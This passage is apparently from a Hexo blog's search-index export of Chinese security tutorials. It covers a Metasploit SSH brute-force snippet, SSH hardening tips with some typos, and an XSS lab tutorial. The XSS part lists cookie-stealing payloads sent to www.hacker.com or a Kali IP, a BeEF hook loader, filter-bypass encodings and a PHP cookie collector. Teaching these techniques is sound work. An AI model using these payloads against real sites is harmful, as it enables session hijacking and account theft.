class="title">auxiliary</span>/<span class="title">scanner</span>/<span class="title">ssh</span>/<span class="title">ssh_login</span></span><br><span class="line"><span class="title">msf</span> <span class="title">auxiliary</span>(<span class="title">scanner</span>/<span class="title">ssh</span>/<span class="title">ssh_login</span>) &gt; <span class="title">set</span> <span class="title">rhosts</span> 192.168.106.134</span><br><span class="line"><span class="title">msf</span> <span class="title">auxiliary</span>(<span class="title">scanner</span>/<span class="title">ssh</span>/<span class="title">ssh_login</span>) &gt; <span class="title">set</span> <span class="title">USER_FILE</span> /<span class="title">root</span>/<span class="title">userlist</span>.<span class="title">txt</span></span><br><span class="line"><span class="title">msf</span> <span class="title">auxiliary</span>(<span class="title">scanner</span>/<span class="title">ssh</span>/<span class="title">ssh_login</span>) &gt; <span class="title">set</span> <span class="title">PASS_FILE</span> /<span class="title">root</span>/<span class="title">passlist</span>.<span class="title">txt</span></span><br><span class="line"><span class="title">msf</span> <span class="title">auxiliary</span>(<span class="title">scanner</span>/<span class="title">ssh</span>/<span class="title">ssh_login</span>) &gt; <span class="title">run</span></span><br></pre></td></tr></table></figure><h2 id="暴力破解防御"><a href="#暴力破解防御" class="headerlink" title="暴力破解防御"></a>暴力破解防御</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>useradd shell 【推荐】</span><br><span class="line">[root@tianyun ~]<span class="comment"># useradd yangge -s /sbin/nologin</span></span><br><span class="line">    </span><br><span class="line"><span class="number">2.</span>密码复杂性【推荐】</span><br><span class="line">字母大小写+数字+特殊字符+<span class="number">20</span>位以上+定期更换</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="number">3.</span>修改默认端口【推荐】</span><br><span class="line">/etc/ssh/sshd_config</span><br><span class="line">    Port <span class="number">22222</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>限止登录的用户和组【推荐】</span><br><span class="line">    <span class="comment">#PermitRootLogin yes</span></span><br><span class="line">    AllowUser yangger</span><br><span class="line">    </span><br><span class="line">    [root@tianyun ~]<span class="comment"># man sshd_config</span></span><br><span class="line">    AllowUser AllowGroups DenyUsers DenyGroups</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="number">5.</span>设置允许的IP访问【可选】</span><br><span class="line">    /etc/hosts.allow,例如sshd:<span class="number">192.168</span><span class="number">.106</span><span class="number">.167</span>:allow</span><br><span class="line">    PAM基于IP限制</span><br><span class="line">    iptables/firewalld</span><br><span class="line">    只能允许从堡垒机</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="number">6.</span>使用DenyHosts自动统计，并将其加入到/etc/hosts.deny</span><br><span class="line">        </span><br><span class="line"><span class="number">7.</span>基于PAM实现登陆限制【推荐】</span><br><span class="line">   模块：pam_tally2.so</span><br><span class="line">   功能：登陆统计</span><br><span class="line">   示例：实现防止对sshd暴力破解</span><br><span class="line">   [root@tianyun ~]<span class="comment"># grep tally2 /etc/pam.d/sshd</span></span><br><span class="line">   auth  required pam_tall2.so deny=<span class="number">2</span> even_deny_root root_unlock_time=<span class="number">30</span> unlock_time=<span class="number">30</span></span><br><span class="line">    <span class="comment">#pam_tall2.so登陆模块，统计登陆错误次数（deny）为2次，even_deny_root是只root用户，root用户不例外。root_unlock_time是root用户的锁定时间，unlock_time普通用户的锁定时间30秒。 </span></span><br><span class="line">        </span><br><span class="line"><span class="number">8.</span>禁用密码改用公钥方式认证</span><br><span class="line">    /etc/ssh/sshd_config</span><br><span class="line">    PasswordAuthentication on</span><br><span class="line">        </span><br><span class="line"><span class="number">9.</span>保护xshell导出会话文件【小心】</span><br><span class="line">        </span><br><span class="line"><span class="number">10.</span>GRUB加密【针对本地破解】</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 - SSH密码暴力破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跨站脚本攻击XSS</title>
      <link href="/2020/04/23/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/"/>
      <url>/2020/04/23/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/</url>
      
        <content type="html"><![CDATA[<h1 id="跨站脚本攻击XSS"><a href="#跨站脚本攻击XSS" class="headerlink" title="跨站脚本攻击XSS"></a>跨站脚本攻击XSS</h1><h2 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h2><p>跨站脚本（ceoss site cript）为了避免与样式混淆，所以简称XSS</p><p>XSS是一种经常出现在web应用中的计算机安全漏洞，也是web中最主流的攻击方式。</p><p>XSS是指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到web页面中，使别的用户访问都会执行相应的嵌入代码。从而盗取用户资料，利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。</p><p>XSS攻击的危害：</p><ol><li>盗取各类用户账号，如机器登陆账号、用户网银账号、各类管理账号</li><li>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</li><li>盗窃企业重要的具有商业价值的资料</li><li>非法转账</li><li>强制发送电子邮件</li><li>网站挂马</li><li>控制受害者机器向其他网站发起攻击</li></ol><h2 id="原理解析"><a href="#原理解析" class="headerlink" title="原理解析"></a>原理解析</h2><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581311436269.png"  alt="1581311436269"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581311705270.png"  alt="1581311705270"></p><p>XSS主要原因：过度信任客户端提交的数据</p><p>XSS主要分类：</p><ul><li>反射型XSS攻击（Reflected XSS）又称为非持久性跨站点脚本攻击，它是最常见的类型的XSS。漏洞产生的原因是攻击者注入的数据反映在响应中。一个典型的非持久性XSS包含一个带XSS攻击向量的链接（即每次攻击需要用户的点击）。</li><li>存储型XSS（Stored XSS）又称为持久型跨站点脚本，它一般发生在XSS攻击向量（一般指XSS攻击代码）存储在网站数据库，当一个页面被用户打开的时候执行。每当用户打开游览器，脚本执行。持久的XSS相比非持久性XSS攻击危害性更大，因为每当用户打开页面，查看内容时脚本将会自动执行。谷歌的orkut曾经就遭受到XSS。</li></ul><h2 id="构造XSS脚本"><a href="#构造XSS脚本" class="headerlink" title="构造XSS脚本"></a>构造XSS脚本</h2><h3 id="常用的HTML标签"><a href="#常用的HTML标签" class="headerlink" title="常用的HTML标签"></a>常用的HTML标签</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span>&gt;</span>iframe 元素会创建包含另外一个文档的内联框架（即行内框架）</span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">textarea</span>&gt;</span>标签定义多行文本输入控件</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>&gt;</span>img 元素向网页嵌入一副图片</span><br><span class="line"><span class="tag">&lt;<span class="name">sript</span>&gt;</span><span class="tag">&lt;<span class="name">sript</span>&gt;</span>标签用语定义客户端。比如JavaScript</span><br><span class="line">    script 元素既可以包含脚本语句，也可以通过src属性指向外部脚本文件</span><br><span class="line">    必需的type属性规定脚本的 MIME 类型</span><br><span class="line">    JAVAScript 的常见应用时图像操作、表单验证以及动态内容更新</span><br></pre></td></tr></table></figure><h3 id="常用的JavaScript方法"><a href="#常用的JavaScript方法" class="headerlink" title="常用的JavaScript方法"></a>常用的JavaScript方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">alertalert() 方法用于显示带有一条指定消息和一个确认按钮的警告框</span><br><span class="line">window.locationwindow.location对象用于获得当前网页的地址（URL），并把游览器重定向到新的页面</span><br><span class="line">location.href返回当前显示的文档的完整URl</span><br><span class="line">onload一张页面或一副图像完成加载</span><br><span class="line">onsubmit确认按钮被点击</span><br><span class="line">onerror在加载文档或图像时发生错误</span><br></pre></td></tr></table></figure><h3 id="构造XSS脚本-1"><a href="#构造XSS脚本-1" class="headerlink" title="构造XSS脚本"></a>构造XSS脚本</h3><p>​    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">弹框警告</span><br><span class="line">此脚本实现弹框提示，一般作为漏洞测试或者演示使用，类似SQL注入漏洞测试中的单引号&#39;，一旦此脚本能执行，也就意味着后端服务没有对特殊字符做过滤&lt;&gt;&#x2F;&#39;就这样可以证明，这个液面位置存在XSS漏洞</span><br><span class="line">&lt;script&gt;alert(&#39;XSS&#39;)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">页面嵌套</span><br><span class="line">&lt;iframe src&#x3D;http:&#x2F;&#x2F;www.baidu.com width&#x3D;300 height&#x3D;300&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line">&lt;iframe src&#x3D;http:&#x2F;&#x2F;www.baidu.com width&#x3D;0 height&#x3D;0 border&#x3D;0&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line"></span><br><span class="line">页面重定向</span><br><span class="line">&lt;script&gt;window.location&#x3D;&quot;http:&#x2F;&#x2F;www.baidu.com&quot;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;location.href&#x3D;&quot;http:&#x2F;&#x2F;www.baidu.com&quot;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">弹框警告并重定向</span><br><span class="line">&lt;script&gt;alert(&quot;请移步到我们的新站&quot;);location.href&#x3D;&quot;http:&#x2F;&#x2F;www.qfedu.com&quot;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;alert(&#39;XSS&#39;);location.href&#x3D;&quot;http:&#x2F;&#x2F;10.1.64.35&#x2F;mutillidea&#x2F;robots.txt&quot;&lt;&#x2F;script&gt;</span><br><span class="line">这里结合一些社工的思路，例如，通过网站内部私信的方式将其发给其他用户。如果其他用户点击并且相信了这些信息，则可可能在另外的站点重新登录（克隆网站收集账号）</span><br><span class="line"></span><br><span class="line">访问恶意代码</span><br><span class="line">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;www.qfedu.com&#x2F;XSS.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;BeEF_IP:3000&#x2F;hook.js&quot;&gt;&lt;&#x2F;script&gt;#结合BeEF收集用户的Cookie</span><br><span class="line"></span><br><span class="line">巧用图片标签</span><br><span class="line">&lt;img src&#x3D;&quot;#&quot; onerror&#x3D;alert(&#39;xss&#39;)&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;javascript:alert(&#39;xss&#39;);&quot;&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;BeEF_IP:3000&#x2F;hook.js&quot;&gt;&lt;&#x2F;img&gt;</span><br><span class="line"></span><br><span class="line">绕过过滤的脚本</span><br><span class="line">大小写&lt;ScrIpt&gt;alert(&#39;xss&#39;)&lt;&#x2F;SCRipt&gt;#通过改变标签的大小写绕过</span><br><span class="line">字符编码 采用URL、Base64等编码</span><br><span class="line">&lt;a</span><br><span class="line">href&#x3D;&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&quot;&gt;yangge&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line">收集用户cookie</span><br><span class="line">打开新窗口并且采用本地cookie访问目标网页，打开新窗口并且采用本地cookie访问目标网页</span><br><span class="line">&lt;script&gt;window.open(&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#x3D;&quot;+document.cookie)&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;document.location&#x3D;&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#x3D;&quot;+document.cookie&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;new Image().src&#x3D;&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#x3D;&quot;+document.cookie;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#39;+document.cookie&quot;&gt;&lt;&#x2F;img&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#x3D;&#39;document.cookie&quot;&gt;&lt;iframe&gt;</span><br><span class="line">    </span><br><span class="line">&lt;script&gt;new Image().src&#x3D;&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#x3D;&#39;document.cookie&quot;;</span><br><span class="line">    img.width &#x3D; 0;img.height &#x3D; 0;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>弹框操作</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581317417070.png"  alt="1581317417070"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581317441166.png"  alt="1581317441166"><br>$$</p><p>$$</p><h3 id="实例：攻击-获取cookie：渗透机kali-linux端操作"><a href="#实例：攻击-获取cookie：渗透机kali-linux端操作" class="headerlink" title="实例：攻击 获取cookie：渗透机kali linux端操作"></a>实例：攻击 获取cookie：渗透机kali linux端操作</h3><ol><li><p>构造收集cookie服务器</p></li><li><p>构造XSS代码并植入到web服务器</p></li><li><p>等待肉鸡触发XSS代码并将cookie发送到kali</p></li><li><p>Cookie利用</p></li></ol><p>在kali启动apache2服务</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581319707486.png"  alt="1581319707486"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kail:~<span class="comment"># vim/var/www/html/cookie_rec.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $cookie = $_GET[<span class="string">'cookie'</span>];</span><br><span class="line">$log = fopen(<span class="string">"cookie.txt"</span>,<span class="string">"a"</span>);</span><br><span class="line">fwrite($log,$cookie . <span class="string">"\n"</span>);</span><br><span class="line">    fclose($log);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581320754497.png"  alt="1581320754497"></p><p>修改权限</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># chown -R www-data.www-data /var/www/</span></span><br></pre></td></tr></table></figure><p>通过渗透机植入XSS代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#39;http:&#x2F;&#x2F;192.168.19.137&#x2F;cookie_rec.php?cookie&#x3D;&#39;+document.cookie)&lt;&#x2F;script&gt;</span><br><span class="line">注：192.168.19.137 为kali Linux IP</span><br><span class="line">注：先清除之前植入的XSS代码</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581322939111.png"  alt="1581322939111"></p><p>在/var/www/html/cookie.txt文件中查看cookie</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581323115654.png"  alt="1581323115654"></p><h2 id="自动化XSS"><a href="#自动化XSS" class="headerlink" title="自动化XSS"></a>自动化XSS</h2><h3 id="BeEF简介"><a href="#BeEF简介" class="headerlink" title="BeEF简介"></a>BeEF简介</h3><p>Browser Exploitation Framework（BeEF）</p><p>BeEF是目前最强大的游览器开源渗透测试框架，通过XSS漏洞配合JS脚本和Metasploit进行渗透；</p><p>BeEF是基于Ruby语言编写的，并且支持图形化界面，操作简单；</p><p><a href="http://beefproject.com/" target="_blank" rel="noopener">http://beefproject.com/</a></p><p><strong>信息收集：</strong></p><ol><li>网络发现</li><li>主机信息</li><li>Cookie获取</li><li>会话劫持</li><li>键盘记录</li><li>插件信息</li></ol><p><strong>持久化控制：</strong></p><ol><li>确认弹窗</li><li>小窗口</li><li>中间人</li></ol><p><strong>社会工程：</strong></p><ol><li>点击劫持</li><li>弹窗警告</li><li>虚假页面</li><li>钓鱼页面</li></ol><p><strong>渗透攻击：</strong></p><ol><li>内网渗透</li><li>Metasploit</li><li>CSRF攻击</li><li>DDOS攻击</li></ol><h3 id="BeEF基础"><a href="#BeEF基础" class="headerlink" title="BeEF基础"></a>BeEF基础</h3><p>启动Apache和BeEF</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># service apache2 start</span></span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581323986109.png"  alt="1581323986109"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581324057328.png"  alt="1581324057328"></p><p>登陆beef，账号密码都为：beef</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581325238917.png"  alt="1581325238917"></p><p>配置攻击命令</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581325374494.png"  alt="1581325374494"></p><p>注：192.168.19.137 为kali linux的ip地址</p><p>肉鸡被攻击后在beef的显示</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581325543357.png"  alt="1581325543357"></p><p>信息收集</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581325726072.png"  alt="1581325726072"></p><p>命令颜色（color）：</p><p>绿色    对目标主机生效并且不可见（不会被发现）</p><p>橙色    对目标主机生效但可能可见（可能被发现）</p><p>灰色    对目标主机未必生效（可验证下）</p><p>红色    对目标主机不生效</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581325928305.png"  alt="1581325928305"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 - XSS攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/04/23/hello-world/"/>
      <url>/2020/04/23/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
